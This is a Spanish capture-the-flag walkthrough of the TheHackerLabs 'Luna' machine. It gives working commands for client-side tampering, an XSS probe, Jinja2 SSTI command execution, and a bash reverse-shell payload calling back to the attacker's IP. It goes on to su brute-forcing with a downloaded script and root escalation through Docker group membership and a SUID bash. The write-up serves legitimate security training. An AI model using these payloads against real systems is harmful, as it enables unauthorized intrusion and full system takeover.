---
title: "Luna - TheHackerLabs"
date: 2025-08-19
draft: false
slug: "THL-writeup-luna"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos, descubrimos que la página web activa en el puerto 80 no está funcionando correctamente y la página web activa del puerto 5000, reporta el uso de Werkzeug, por lo que comenzamos analizando esta página. Durante el análisis, notamos que el único input en la página está bloqueado, impidiendo que escribamos en él. Aplicando Client-Side Tampering, logramos aplicar un bypass a esta restricción y conseguimos hacer funcionar dicho input. Probando el input, descubrimos que es vulnerable a XSS y SSTI, siendo esta última, la forma en que nos mandamos una Reverse Shell a nuestra máquina, logrando el acceso principal a la máquina víctima. Dentro, encontramos un archivo con credenciales de acceso al servicio MySQL, que usamos para enumerarlo, encontrando así la contraseña codificada en base64 de un usuario de la máquina. Decodificando dicha contraseña, nos autenticamos con ese usuario. En los archivos de ese usuario, encontramos un wordlist que contiene una lista de contraseñas, que usamos para aplicar fuerza bruta a los usuarios de la máquina, identificando la contraseña de otro usuario al que nos autenticamos. Como este nuevo usuario, descubrimos que está dentro del grupo Docker, lo que nos permite crear un contenedor de la raíz de la máquina víctima al que cualquier cambio que le hagamos, se verá reflejado fuera del contenedor, hacemos esto apoyándonos de la guía de GTFOBins, siendo así que asignamos permisos SUID a la Bash con lo que logramos escalar privilegios fuera del contenedor y ser Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "Werkzeug", "Flask", "MySQL", "Docker", "Client-Side Tampering", "Bypassing Client-Side Restrictions (Client-Side Tampering)", "Cross-Site Scripting (XSS)", "Server Side Template Injection (SSTI)", "MySQL Enumeration", "Base64 Decodification", "User Pivoting", "Internal Brute Force Attack", "Abusing Docker Group", "Privesc - Abusing Docker Group", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "whatweb"
  - "nc"
  - "pwd"
  - "cat"
  - "grep"
  - "hostname"
  - "ss"
  - "mysql"
  - "echo"
  - "base64"
  - "su"
  - "suBF.sh"
  - "chmod"
  - "wget"
  - "sudo"
  - "docker"
  - "bash"
links:
  - "https://exploit-notes.hdks.org/exploit/web/framework/flask-jinja2/"
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2"
  - "https://github.com/carlospolop/su-bruteforce"
  - "https://gtfobins.github.io/gtfobins/docker/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-luna/luna.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.50
PING 192.168.100.50 (192.168.100.50) 56(84) bytes of data.
64 bytes from 192.168.100.50: icmp_seq=1 ttl=64 time=1.35 ms
64 bytes from 192.168.100.50: icmp_seq=2 ttl=64 time=0.804 ms
64 bytes from 192.168.100.50: icmp_seq=3 ttl=64 time=0.765 ms
64 bytes from 192.168.100.50: icmp_seq=4 ttl=64 time=3.75 ms

--- 192.168.100.50 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 0.765/1.667/3.750/1.224 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.50 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 12:39 CST
Initiating ARP Ping Scan at 12:39
Scanning 192.168.100.50 [1 port]
Completed ARP Ping Scan at 12:39, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:39
Scanning 192.168.100.50 [65535 ports]
Discovered open port 80/tcp on 192.168.100.50
Discovered open port 5000/tcp on 192.168.100.50
Completed SYN Stealth Scan at 12:39, 19.99s elapsed (65535 total ports)
Nmap scan report for 192.168.100.50
Host is up, received arp-response (0.0022s latency).
Scanned at 2025-08-19 12:39:08 CST for 20s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.26 seconds
           Raw packets sent: 79635 (3.504MB) | Rcvd: 65537 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solo hay dos puertos abiertos y me da curiosidad el **puerto 5000**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 80,5000 192.168.100.50 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 12:39 CST
Nmap scan report for 192.168.100.50
Host is up (0.00088s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.58

|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.58 (Ubuntu)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.12.3)

|_http-title: RodGar
|_http-server-header: Werkzeug/3.0.3 Python/3.12.3
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: 192.168.100.50

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.15 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

La página web activa en el **puerto 80** parece que no está funcionando.

Pero, la página web activa en el **puerto 5000**, está mostrando que usa **Werkzeug**, lo que nos indica que puede ser vulnerable a ciertos ataques.

Vamos a verla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Página Web de Puerto 5000 {#P5000}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-luna/Captura1.png">
</p>

Es una página un poco extraña que parece reproducir saludos, pero el input para escribir algo está bloqueado.

Curiosamente, **Wappalizer** no pudo identificar las tecnologías que está usando la página web.

Usemos **whatweb** como alternativa:
```bash
whatweb http://192.168.100.50:5000
http://192.168.100.50:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.12.3], IP[192.168.100.50], Python[3.12.3], Title[RodGar], Werkzeug[3.0.3]
```
Confirmamos que se está utilizando **Werkzeug** que, en caso de que esté utilizando la plantilla **Jinja2**, es posible que sea vulnerable a **Server Side Template Injection (SSTI)**.

Pero sigamos analizando la página.

Si revisamos el código fuente, veremos cómo se está aplicando el bloqueo en el input, pero si no estuviera bloqueado, el texto introducido nos lleva a la página `/greet`:

<p align="center">
<img src="/assets/images/THL-writeup-luna/Captura2.png">
</p>

Aunque si la visitamos, tendremos un error:

<p align="center">
<img src="/assets/images/THL-writeup-luna/Captura3.png">
</p>

De ahí en fuera, no encontraremos nada más.

Lo que podemos hacer es, tratar de modificar la página web desde el inspector para comprobar si podemos hacer funcionar el input que está siendo bloqueado.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Bypass de Restricciones del Lado del Cliente (Client-Side Tampering) {#Tampering}

La idea consiste en modificar la página web con el inspector del navegador web, mediante la manipulación de su código fuente.

| **Client-Side Tampering** |
|:-------------------------:|
| *Client-side tampering es la acción de manipular o alterar cualquier dato, comportamiento o flujo que se ejecuta en el navegador antes de que llegue al servidor, con el objetivo de modificar la manera en que la aplicación procesa la información.* |

Para entrar en el **Inspector** desde tu navegador, presiona clic derecho y selecciona la opción **Inspector**:

<p align="center">
<img src="/assets/images/THL-writeup-luna/Captura4.png">
</p>

O desde tu teclado, presiona las teclas `Ctrl + Shift + I` o solo la tecla `F12`.

Notarás que él se abre la pestaña del **Inspector** en la parte inferior de la página web:

<p align="center">
<img src="/assets/images/THL-writeup-luna/Captura5.png">
</p>

Moviéndote entre el código, verás que saldrán ventanas indicando a que parte de la página web pertenece ese código. 

Ahí podremos ver el input y el atributo que lo está bloqueando, siendo el atributo `disable`.

Si la eliminamos y damos **Enter**, ya podremos escribir en el input:

<p align="center">
<img src="/assets/images/THL-writeup-luna/Captura6.png">
</p>

Y si enviamos ese texto, se reproducira en la página web en la página `/greet`:

<p align="center">
<img src="/assets/images/THL-writeup-luna/Captura7.png">
</p>

Excelente, hemos aplicado la **Manipulación del Lado del Cliente** y nos ha dejado probar la funcionalidad bloqueada de la página web.

Regresa a la página anterior sin cerrar el inspector y debería dejarte seguir escribiendo en el input; si no, ya sabes qué hacer.

### Aplicando Cross-Site Scripting (XSS) y Server Side Template Injectio (SSTI) {#XSSySSTI}

Probemos si este input es vulnerable a **XSS**.

Prueba el siguiente payload en el input:
```bash
<script>alert('XSS')</script>
```

<p align="center">
<img src="/assets/images/THL-writeup-luna/Captura8.png">
</p>

Funcionó, lo que me da a entender que el input no está sanitizado.

Recordemos que se está usando **Werkzeug**, por lo que podemos probar si es vulnerable a **Server Side Template Injection (SSTI)**.

Aquí te dejo un blog y un repositorio sobre este tema:
* <a href="https://exploit-notes.hdks.org/exploit/web/framework/flask-jinja2/" target="_blank">Flask Jinja2 Pentesting</a>
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2" target="_blank">PayloadAllTheThings: Jinja2</a>

Prueba la siguiente multiplicación:

{% raw %}
```bash
{{ 4*5 }}
```
{% endraw %}

Si la enviamos, debería darnos el resultado de la multiplicación:

<p align="center">
<img src="/assets/images/THL-writeup-luna/Captura9.png">
</p>

Entonces, vamos a probar si ejecuta el comando **id** con el siguiente payload:

{% raw %}
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
{% endraw %}

Probémoslo:

<p align="center">
<img src="/assets/images/THL-writeup-luna/Captura10.png">
</p>

Excelente, si lo está ejecutando.

Directamente, utilicemos una **Reverse Shell** de **Bash**.

Inicia un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Ahora, ejecutamos la **Reverse Shell** con el siguiente payload:

{% raw %}
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'").read() }}
```
{% endraw %}

Una vez que la ejecutes en la página web, observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.50] 34214
bash: cannot set terminal process group (748): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheHackersLabs-Luna:~/RODGAR$ whoami
whoami
www-data
```
Listo, estamos dentro.

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Continuemos.

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima {#linEnum}

Al ganar acceso a la máquina víctima, entramos directamente donde están los archivos de la página web:
```bash
www-data@TheHackersLabs-Luna:~/RODGAR$ pwd
/var/www/RODGAR
www-data@TheHackersLabs-Luna:~/RODGAR$ ls
app.py  config.php  static  venv
```

Y si analizamos el script **app.py**, vemos que es vulnerable porque no se está sanitizando el uso de la plantilla de **Flask**:
```bash
www-data@TheHackersLabs-Luna:~/RODGAR$ cat app.py 
from flask import Flask, request, render_template_string, send_from_directory
app = Flask(__name__)
...
@app.route('/greet', methods=['POST'])
def greet():
    name = request.form['name']
    template = f'''
    <!DOCTYPE html>
...
        <div class="container">
            <h1>Hello, {name}!</h1>
        </div>
    </body>
    </html>
    '''
    return render_template_string(template)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

Veamos qué usuarios existen en la máquina:
```bash
www-data@TheHackersLabs-Luna:~/RODGAR$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
juan:x:1001:1001::/home/juan:/bin/bash
jose:x:1002:1002::/home/jose:/bin/bash
john:x:1003:1003::/home/john:/bin/bash
carmen:x:1004:1004::/home/carmen:/bin/bash
```
Hay 4 usuarios aparte del **Root**.

Si revisamos el directorio `/home`, ahí estará el directorio de cada usuario, pero no tenemos permisos para ver el contenido de cada uno:
```bash
www-data@TheHackersLabs-Luna:~/RODGAR$ ls -la /home
total 24
drwxr-xr-x  6 root   root   4096 ago 14  2024 .
drwxr-xr-x 22 root   root   4096 ago 15  2024 ..
drwxr-x---  2 carmen carmen 4096 ago 12  2024 carmen
drwxr-x---  2 john   john   4096 ago 12  2024 john
drwxr-x---  2 jose   jose   4096 ago 13  2024 jose
drwxr-x---  2 juan   juan   4096 ago 14  2024 juan
```

Revisando el directorio `/opt`, veremos que hay un contenedor, pero no podremos ver su contenido:
```bash
www-data@TheHackersLabs-Luna:~/RODGAR$ ls -la /opt
total 12
drwxr-xr-x  3 root root 4096 ago  9  2024 .
drwxr-xr-x 22 root root 4096 ago 15  2024 ..
drwx--x--x  4 root root 4096 ago  9  2024 containerd
```
Esto nos da a entender que se está utilizando **Docker**.

Comprobémoslo revisando la IP de la máquina con el comando **hostname**:
```bash
www-data@TheHackersLabs-Luna:~/RODGAR$ hostname -I
192.168.100.50 172.17.0.1
```
Estamos dentro de la máquina, pero vemos que sí existe el uso de **Docker** por la IP `172.17.0.1`.

### Enumeración del Servicio MySQL y Convirtiendonos en Usuario juan {#MySQL}

Recordando los archivos que vimos en el directorio `/var/www/RODGAR`, vimos un archivo llamado **config.php**.

Veamos qué contiene:
```bash
www-data@TheHackersLabs-Luna:~/RODGAR$ cat config.php 
<?php
$servername = "localhost";
$username = "admin";
$password = "sporting";
$dbname = "rodgar";

// Crear conexión
$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar conexión
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}
?>
```
Muy bien, tenemos las credenciales de acceso para el **servicio MySQL**.

Revisando los puertos abiertos con el comando **ss**, vemos el **puerto 3306** abierto, por lo que podemos conectarnos al **MySQL**:
```bash
www-data@TheHackersLabs-Luna:~/RODGAR$ ss -tulnp | grep tcp
tcp   LISTEN 0      128                               0.0.0.0:5000       0.0.0.0:*    users:(("python",pid=932,fd=4),("python",pid=932,fd=3),("python",pid=748,fd=3))
tcp   LISTEN 0      151                             127.0.0.1:3306       0.0.0.0:*                                                                                   
tcp   LISTEN 0      70                              127.0.0.1:33060      0.0.0.0:*                                                                                   
tcp   LISTEN 0      4096                           127.0.0.54:53         0.0.0.0:*                                                                                   
tcp   LISTEN 0      4096                            127.0.0.1:45673      0.0.0.0:*                                                                                   
tcp   LISTEN 0      4096                        127.0.0.53%lo:53         0.0.0.0:*                                                                                   
tcp   LISTEN 0      511                                     *:80               *:*
```

Entremos a **MySQL**:
```bash
www-data@TheHackersLabs-Luna:~/RODGAR$ mysql -h localhost -u 'admin' -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
...
mysql>
```
Entramos.

Deberíamos la misma BD que menciona el script **config.php**:
```bash
mysql> show databases;
+--------------------+

| Database           |
+--------------------+

| information_schema |
| performance_schema |
| rodgar             |
+--------------------+
3 rows in set (0,01 sec)
```
Ahí está.

Usémosla y veamos sus tablas:
```bash
mysql> use rodgar;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------+

| Tables_in_rodgar |
+------------------+

| user             |
+------------------+
1 row in set (0,00 sec)
```
Solamente hay una.

Veamos su contenido:
```bash
mysql> select * from user;
+-------+----------------------------------+

| users | password                         |
+-------+----------------------------------+

| juan  | YzBvW1VrbU0yTVRSVGU4QGpOLk0oOWIK |
+-------+----------------------------------+
1 row in set (0,00 sec)
```
Genial, tenemos la contraseña del **usuario juan**.

Aunque sí la usamos como tal, no servirá, pues posiblemente esté codificada.

Parece estar codificada en **base64** y podemos comprobarlo si la decodificamos y usamos el resultado:
```bash
echo -n "YzBvW1VrbU0yTVRSVGU4QGpOLk0oOWIK" | base64 -d
c0o[UkmM2MTRTe8@jN.M(9b
```
Otra forma en la que podríamos saber si es codificación en **base64**, sería por la cantidad y tipo de caracteres usados.

En este caso se están usando los caracteres `A–Z a–z 0–9` y, aunque son 32 caracteres, que son los exactos para **MD5**, no cumple con los caracteres de este.

Probemos el resultado:
```bash
www-data@TheHackersLabs-Luna:~/RODGAR$ su juan
Password: 
juan@TheHackersLabs-Luna:/var/www/RODGAR$ whoami
juan
```
Estamos dentro.

Si nos movemos a su directorio, encontraremos la flag del usuario:
```bash
juan@TheHackersLabs-Luna:/var/www/RODGAR$ cd /home/juan/
juan@TheHackersLabs-Luna:~$ ls -la
total 16
drwxr-x--- 2 juan juan 4096 ago 14  2024 .
drwxr-xr-x 6 root root 4096 ago 14  2024 ..
lrwxrwxrwx 1 root root    9 ago 13  2024 .bash_history -> /dev/null
-rw-rw-r-- 1 juan juan  156 ago 12  2024 password.txt
-rw-rw-r-- 1 juan juan   33 ago 13  2024 user.txt
juan@TheHackersLabs-Luna:~$ cat user.txt
...
```

### Aplicando Fuerza Bruta a Usuarios desde Máquina Víctima {#su}

Dentro de los archivos del **usuario juan**, vemos que hay una lista de contraseñas:
```bash
juan@TheHackersLabs-Luna:~$ cat password.txt 
Tr0ub4dor&3
M0nkey!2024
L3tMeIn@2024
...
```
Sabemos que hay 3 usuarios, pero ir probando de uno en uno no es lo ideal.

Así que investigando un poco en internet, encontré un script que realiza la fuerza bruta desde la máquina víctima, usando el comando **su**:
* <a href="https://github.com/carlospolop/su-bruteforce" target="_blank">Repositorio de carlospolop: su-bruteforce</a>

En este punto, podemos descargar el script en la máquina víctima si la configuramos para que tenga conexión a internet o, si no, tendríamos que descargar el script en nuestra máquina y luego pasarlo a la máquina víctima con un servidor web de **Python** y con **wget**.

En mi caso, la máquina víctima tiene conexión a internet, por lo que puedo descargar directamente el script ahí:
```bash
juan@TheHackersLabs-Luna:~$ wget https://raw.githubusercontent.com/carlospolop/su-bruteforce/refs/heads/master/suBF.sh
juan@TheHackersLabs-Luna:~$ ls
password.txt  suBF.sh  user.txt
juan@TheHackersLabs-Luna:~$ chmod +x suBF.sh
```
Tan solo tenemos que darle el usuario a probar y el wordlist de contraseñas.

Probando con todos los usuarios, logramos encontrar la contraseña del **usuario jose**:
```bash
juan@TheHackersLabs-Luna:~$ ./suBF.sh -u jose -w password.txt
  [+] Bruteforcing jose...
  You can login as jose using password: W1nter$2024
  Wordlist exhausted
```

Comprobeḿoslo:
```bash
juan@TheHackersLabs-Luna:~$ su jose
Password: 
jose@TheHackersLabs-Luna:/home/juan$ whoami
jose
```
Ya somos el **usuario jose**.

Pero al movernos a su directorio, no encontraremos nada.
```bash
jose@TheHackersLabs-Luna:/home/juan$ cd ../jose
jose@TheHackersLabs-Luna:~$ ls -la
total 8
drwxr-x--- 2 jose jose 4096 ago 13  2024 .
drwxr-xr-x 6 root root 4096 ago 14  2024 ..
lrwxrwxrwx 1 jose jose    9 ago 13  2024 .bash_history -> /dev/null
```

### Escalando Privilegios Abusando de Grupo Docker {#Docker}

Este usuario no tiene privilegios en la máquina:
```bash
jose@TheHackersLabs-Luna:~$ sudo -l
[sudo] password for jose: 
Sorry, user jose may not run sudo on TheHackersLabs-Luna.
```

Pero si revisamos a qué grupos pertenece, descubrimos que está dentro del grupo **Docker**:
```bash
jose@TheHackersLabs-Luna:~$ id
uid=1002(jose) gid=1002(jose) groups=1002(jose),111(docker)
```
Esto quiere decir que este usuario puede crear contenedores.

Si buscamos en la **guía de GTFOBins**, encontraremos una forma de escalar privilegios:
* <a href="https://gtfobins.github.io/gtfobins/docker/" target="_blank">GTFOBins: Docker</a>

Usaremos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-luna/Captura11.png">
</p>

**Nota**: Necesitaremos internet en la máquina víctima o debemos descargar y pasarle la imagen **alpine** para que funcione la escalada.

Ejecutémoslo:
```bash
jose@TheHackersLabs-Luna:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
9824c27679d3: Pull complete 
Digest: sha256:4bcff63911fcb4448bd4fdacec207030997caf25e9bea4045fa6c8c44de311d1
Status: Downloaded newer image for alpine:latest
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@90eab57e35bb:/# whoami
root
```
Excelente, creamos una montura completa de la raíz (`-v /:/mnt`).

Esto nos permite realizar cambios en el contenedor que se verán reflejados en la máquina principal.

Entonces, podemos darle **permisos SUID** a la **Bash**.

Sal un momento del contendor y revisa los permisos de la **Bash**:
```bash
jose@TheHackersLabs-Luna:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 mar 31  2024 /bin/bash
```

Ejecuta el mismo comando para crear el contenedor de nuevo y dale los **permisos SUID** a la **Bash**. Cuando lo hagas, sal del contenedor:
```bash
root@e5ad18c4c40b:/# chmod u+s /bin/bash
root@e5ad18c4c40b:/# exit
exit
```

Vuelve a revisar los permisos de la **Bash**:
```bash
jose@TheHackersLabs-Luna:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 mar 31  2024 /bin/bash
```
Ya tiene los **permisos SUID**.

Usemos la **Bash** con privilegios:
```bash
jose@TheHackersLabs-Luna:~$ bash -p
bash-5.2# whoami
root
```
Somos **Root**.

Busquemos la última flag:
```bash
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
...
```
Y con esto, terminamos la máquina.
